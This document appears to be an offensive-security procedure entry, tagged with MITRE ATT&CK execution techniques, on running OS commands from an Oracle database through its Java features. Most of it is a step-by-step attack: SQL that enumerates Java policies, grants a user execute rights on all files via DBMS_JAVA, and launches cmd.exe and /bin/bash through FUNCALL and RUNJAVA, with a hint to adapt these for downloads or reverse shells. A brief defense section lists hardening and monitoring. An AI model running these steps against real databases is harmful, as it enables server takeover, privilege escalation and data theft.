---
id: 5ec4f784-5fa2-47a6-80ee-9fd1adde0191
name: Oracle-SQL-and-Java-Command-Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:35.312142+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Execution through API|T1106 - Execution through API]]'
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
sub_techniques: []
tags:
  - '[[tags/Oracle Java Execution]]'
  - '[[tags/Oracle SQL Command Execution]]'
  - '[[tags/Oracle SQL Injection]]'
  - oracle
  - java
  - rce
  - database
commands:
  - '[[commands/grant-java-permissions-to-user]]'
  - '[[commands/select-from-dba-java-policy]]'
  - '[[commands/select-from-user-java-policy]]'
platforms:
  - Oracle Database
tools: []
validated: true
---

# Oracle-SQL-and-Java-Command-Execution

## Summary

This procedure enables attackers to execute arbitrary SQL commands and Java code within an Oracle database environment, potentially leading to unauthorized data access, privilege escalation, and remote code execution on the underlying operating system. It leverages Java policy enumeration, permission granting, and DBMS Java packages to run OS commands, commonly exploited via SQL injection or direct database access.

## Description

In Oracle databases, Java capabilities are integrated via the JVM, allowing stored Java procedures and dynamic execution. Attackers with SQL injection access or low-privileged database credentials can query Java policies to assess permissions, grant additional privileges using DBMS_JAVA, and then invoke functions like DBMS_JAVA_TEST.FUNCALL or DBMS_JAVA.RUNJAVA to execute shell commands. This technique targets environments where Java is enabled (default in many Oracle setups) and can bypass some application-layer controls. It is particularly effective against unpatched Oracle instances or misconfigured permissions, resulting in full system compromise if the database server has OS-level access.

## Requirements

1. Valid SQL access to the Oracle database (e.g., via SQL*Plus, JDBC, or injection point).
2. Knowledge of target user (e.g., SCOTT) and basic Oracle PL/SQL syntax.
3. Enabled Java VM in the database (check via SELECT * FROM v$option WHERE parameter = 'Java Enabled';).
4. Sufficient privileges to query policies and execute DBMS_JAVA (may require initial escalation).

## Defense

Defensive measures and detection strategies:

- Implement strict input validation, prepared statements, and web application firewalls (WAF) to block SQL injection attempts.
- Disable unnecessary Java features by revoking execute privileges on DBMS_JAVA and related packages (e.g., REVOKE EXECUTE ON DBMS_JAVA FROM PUBLIC;).
- Monitor database audit logs for suspicious queries involving DBMS_JAVA, policy grants, or unusual SELECT/FUNCALL executions.
- Use database activity monitoring (DAM) tools like Oracle Audit Vault to alert on Java permission changes and OS command invocations.
- Regularly review and minimize Java policy grants using DBA_JAVA_POLICY views.

## Objectives

1. Enumerate existing Java permissions to identify exploitable configurations.
2. Grant Java runtime and file permissions to enable OS command execution.
3. Execute arbitrary operating system commands via Java wrappers for data exfiltration or persistence.
4. Achieve remote code execution leading to full server compromise.

## Instructions

### Step 1: Enumerate Java Policies

**Context**: Query the database to list Java permissions for the current user and the entire database, revealing if sufficient privileges exist for execution or if grants are needed. This helps assess the attack surface without triggering alerts.

**Command** ([[commands/select-from-dba-java-policy]]):
```sql
select * from dba_java_policy;
```

> This command retrieves global Java policy details, including grantee, permissions, and targets. Run it to check database-wide configurations.

**Command** ([[commands/select-from-user-java-policy]]):
```sql
select * from user_java_policy;
```

> This command lists policies specific to the current user. Expected output includes columns like GRANTEE, TYPE, NAME, ACTION, and GRANT_OPTION. Look for RuntimePermission or FilePermission entries indicating execution capabilities.

**Expected Output**: Tables showing policy details, e.g., rows with 'SYS:java.io.FilePermission' and actions like 'execute' or 'read'.

### Step 2: Grant Java Permissions

**Context**: If policies are insufficient, grant file execution and runtime descriptor permissions to a target user (e.g., SCOTT) using DBMS_JAVA. This step escalates Java capabilities to allow OS interactions.

**Command** ([[commands/grant-java-permissions-to-user]]):
```sql
exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
```

> These statements grant execute on all files, write to file descriptors, and read from file descriptors. Verify by re-running policy queries from Step 1. No output if successful; errors indicate insufficient privileges.

**Expected Output**: Successful grants produce no rows or errors; confirm via policy selects showing new entries.

### Step 3: Execute OS Commands via FUNCALL

**Context**: Use DBMS_JAVA_TEST.FUNCALL to invoke the Java Wrapper class for running OS commands. Adapt for Windows or Linux based on the target server OS.

**Code** ([[codes/execute-os-command-via-dbms-java-test-funcall]]):
```sql
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL;
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual;
```

> The first query runs a Windows dir command, redirecting output to a file. The second runs a Linux ls command. Expected output is the return value from FUNCALL (often 0 for success). Check created files (e.g., c:\test.txt or /tmp/OUT2.LST) for command results.

**Expected Output**: Numeric return code (e.g., 0) indicating success; verify by accessing output files on the server.

### Step 4: Execute Shell Commands via RUNJAVA

**Context**: Alternatively, use DBMS_JAVA.RUNJAVA for direct Java execution of shell commands, useful for more complex operations or when FUNCALL is restricted.

**Code** ([[codes/execute-shell-command-via-dbms-java-runjava]]):
```sql
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL;
```

> This executes a Linux ls command, redirecting to /tmp/OUT.LST. Adapt the shell command as needed (e.g., for downloads or reverse shells). Expected output is the Java execution result.

**Expected Output**: Return value from RUNJAVA; success confirmed by output file contents (e.g., directory listing in /tmp/OUT.LST).

**Code** ([[codes/query-java-policies-dba-and-user]]):
```sql
select * from dba_java_policy;
select * from user_java_policy;
```

> Use this combined query for quick policy checks post-grant.

**Code** ([[codes/grant-java-file-and-runtime-permissions]]):
```sql
exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
```

> Embedded for reference in permission granting.
